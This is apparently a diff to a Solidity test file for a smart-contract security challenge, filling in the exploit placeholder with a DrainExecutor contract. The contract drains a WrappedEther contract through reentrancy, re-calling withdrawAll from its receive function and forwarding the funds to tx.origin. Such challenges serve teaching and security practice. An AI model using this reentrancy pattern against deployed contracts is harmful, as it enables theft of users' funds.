@@ -16,12 +16,39 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        DrainExecutor executor = new DrainExecutor{value: 0.01 ether}(instance);
+        executor.initiateDrain();
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract DrainExecutor {
+    WrappedEther public vulnerableContract;
+    uint256 public triggerThreshold;
+
+    constructor(WrappedEther _contract) payable {
+        vulnerableContract = _contract;
+        triggerThreshold = msg.value;
+    }
+
+    function initiateDrain() external {
+        vulnerableContract.deposit{value: address(this).balance}(address(this));
+        executeWithdrawal();
+    }
+
+    function executeWithdrawal() internal {
+        vulnerableContract.withdrawAll();
+        payable(tx.origin).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        if (msg.sender.balance >= triggerThreshold) {
+            executeWithdrawal();
+        }
     }
 }
